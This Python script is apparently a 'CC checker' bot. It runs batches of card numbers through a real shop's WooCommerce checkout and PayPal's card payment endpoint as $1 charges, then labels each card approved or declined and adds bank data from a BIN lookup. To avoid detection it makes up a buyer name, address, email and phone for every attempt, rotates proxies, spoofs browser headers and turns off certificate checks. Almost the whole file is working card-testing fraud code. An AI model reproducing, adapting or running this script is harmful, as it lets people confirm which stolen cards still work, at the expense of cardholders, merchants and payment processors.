import requests
import re
import time
import random
import json
import string
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_random_proxy():
    """Get a random proxy from proxy.txt file - same as p.py"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()

            # Parse proxy string (format: host:port:username:password)
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

def generate_full_name():
    """Generate random first and last name"""
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    return first_name, last_name

def generate_address():
    """Generate random US address"""
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]

    return city, state, street_address, zip_code

def generate_random_account():
    """Generate random email account"""
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_phone():
    """Generate random phone number"""
    number = ''.join(random.choices(string.digits, k=7))
    return f"303{number}"

def get_bin_info(bin_number):
    """Get BIN information (same as in p.py)"""
    if not bin_number or len(bin_number) < 6:
        return get_smart_fallback(bin_number)
    
    try:
        response = requests.get(
            f'https://lookup.binlist.net/{bin_number}', 
            timeout=3,
            headers={"Accept-Version": "3", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        )
        if response.status_code == 200:
            data = response.json()
            if data and data.get('scheme'):
                bank_name = data.get('bank', {}).get('name', 'MAJOR BANK')
                country_name = data.get('country', {}).get('name', 'UNITED STATES')
                country_emoji = data.get('country', {}).get('emoji', '🇺🇸')
                
                return {
                    'brand': data.get('scheme', 'UNKNOWN').upper(),
                    'type': data.get('type', 'CREDIT').upper(),
                    'level': data.get('brand', data.get('scheme', 'UNKNOWN')).upper(),
                    'bank': bank_name,
                    'country': country_name,
                    'emoji': country_emoji
                }
    except:
        pass
    
    return get_smart_fallback(bin_number)

def get_smart_fallback(bin_number):
    """Smart fallback with realistic data"""
    if bin_number and len(bin_number) >= 1:
        if bin_number.startswith('4'):
            brand = 'VISA'
        elif bin_number.startswith('5'):
            brand = 'MASTERCARD'
        elif bin_number.startswith('34') or bin_number.startswith('37'):
            brand = 'AMEX'
        elif bin_number.startswith('6'):
            brand = 'DISCOVER'
        else:
            brand = 'VISA'
    else:
        brand = 'VISA'
    
    return {
        'brand': brand,
        'type': 'CREDIT',
        'level': 'STANDARD',
        'bank': f'{brand} ISSUING BANK',
        'country': 'UNITED STATES',
        'emoji': '🇺🇸'
    }

def check_status_paypal(result_text):
    """Check PayPal response status - using the same logic as original PayP.py"""
    if ('ADD_SHIPPING_ERROR' in result_text or
        '"status": "succeeded"' in result_text or
        'Thank You For Donation.' in result_text or
        'Your payment has already been processed' in result_text or
        'Success' in result_text):
        return "APPROVED CC", "CHARGE 1$ ✅", True
    
    elif 'is3DSecureRequired' in result_text or 'OTP' in result_text:
        return "APPROVED CC", "3D SECURE [OTP] ✅", True
    
    elif 'INVALID_SECURITY_CODE' in result_text:
        return "APPROVED CC", "CCN ✅", True
    
    elif 'EXISTING_ACCOUNT_RESTRICTED' in result_text:
        return "APPROVED CC", "EXISTING ACCOUNT RESTRICTED ✅", True
    
    elif 'INVALID_BILLING_ADDRESS' in result_text:
        return "APPROVED CC", "INVALID BILLING ADDRESS ✅", True
    
    else:
        return "DECLINED CC", "DECLINED ❌", False

def check_card_paypal(cc_line):
    """Main PayPal card checking function"""
    start_time = time.time()
    
    try:
        # Parse card details
        n, mm, yy, cvc = cc_line.strip().split('|')
        
        # Format month and year
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" not in yy:
            yy = f'20{yy}'
        
        # Generate user info
        user_agent = generate_user_agent()
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        email = generate_random_account()
        phone = generate_phone()
        
        # Get proxy
        proxy = get_random_proxy()
        
        # Start session
        session = requests.Session()
        
        # Step 1: Add to cart
        files = {
            'quantity': (None, '1'),
            'add-to-cart': (None, '4451'),
        }
        
        from requests_toolbelt.multipart.encoder import MultipartEncoder
        multipart_data = MultipartEncoder(fields=files)
        
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': multipart_data.content_type,
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/shop/i-buy/',
            'user-agent': user_agent,
        }
        
        response = session.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, proxies=proxy, verify=False)
        
        # Step 2: Get checkout page
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://switchupcb.com/cart/',
            'user-agent': user_agent,
        }
        
        response = session.get('https://switchupcb.com/checkout/', headers=headers, proxies=proxy, verify=False)
        
        # Extract necessary tokens
        sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
        nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text)
        check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
        create = re.search(r'create_order.*?nonce":"(.*?)"', response.text)
        
        if not all([sec, nonce, check, create]):
            return "❌ Failed to extract required tokens from checkout page"
        
        sec = sec.group(1)
        nonce = nonce.group(1)
        check = check.group(1)
        create = create.group(1)
        
        # Step 3: Create PayPal order
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/checkout/',
            'user-agent': user_agent,
        }
        
        params = {
            'wc-ajax': 'ppc-create-order',
        }
        
        json_data = {
            'nonce': create,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={email}&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
            'createaccount': False,
            'save_payment_method': False,
        }
        
        response = session.post('https://switchupcb.com/', params=params, headers=headers, json=json_data, proxies=proxy, verify=False)
        
        if 'data' not in response.json() or 'id' not in response.json()['data']:
            return "❌ Failed to create PayPal order"
        
        order_id = response.json()['data']['id']
        
        # Step 4: Process payment with card
        headers = {
            'authority': 'my.tinyinstaller.top',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://my.tinyinstaller.top',
            'referer': 'https://my.tinyinstaller.top/checkout/',
            'user-agent': user_agent,
        }
        
        json_data = {
            'query': '''
                mutation payWithCard(
                    $token: String!
                    $card: CardInput!
                    $phoneNumber: String
                    $firstName: String
                    $lastName: String
                    $shippingAddress: AddressInput
                    $billingAddress: AddressInput
                    $email: String
                    $currencyConversionType: CheckoutCurrencyConversionType
                    $installmentTerm: Int
                    $identityDocument: IdentityDocumentInput
                ) {
                    approveGuestPaymentWithCreditCard(
                        token: $token
                        card: $card
                        phoneNumber: $phoneNumber
                        firstName: $firstName
                        lastName: $lastName
                        email: $email
                        shippingAddress: $shippingAddress
                        billingAddress: $billingAddress
                        currencyConversionType: $currencyConversionType
                        installmentTerm: $installmentTerm
                        identityDocument: $identityDocument
                    ) {
                        flags {
                            is3DSecureRequired
                        }
                        cart {
                            intent
                            cartId
                            buyer {
                                userId
                                auth {
                                    accessToken
                                }
                            }
                        }
                    }
                }
            ''',
            'variables': {
                'token': order_id,
                'card': {
                    'cardNumber': n,
                    'type': 'VISA',
                    'expirationDate': mm + '/' + yy[2:],  # MM/YY format
                    'postalCode': zip_code,
                    'securityCode': cvc,
                },
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': street_address,
                    'line2': None,
                    'city': city,
                    'state': state,
                    'postalCode': zip_code,
                    'country': 'US',
                },
                'email': email,
                'currencyConversionType': 'VENDOR',
            },
        }
        
        response = session.post(
            'https://www.paypal.com/graphql?fetch_credit_form_submit',
            headers=headers,
            json=json_data,
            proxies=proxy,
            verify=False
        )
        
        elapsed_time = time.time() - start_time
        response_text = response.text
        
        # Check status and format response
        status, reason, approved = check_status_paypal(response_text)
        bin_info = get_bin_info(n[:6]) or {}
        
        # Format response similar to p.py
        response_formatted = f"""
{status} {'❌' if not approved else '✅'}

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 1$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        
        return response_formatted
        
    except Exception as e:
        return f"❌ Error: {str(e)}"

# For testing directly
if __name__ == "__main__":
    test_card = "4556737586899855|12|2026|123"
    result = check_card_paypal(test_card)
    print(result)
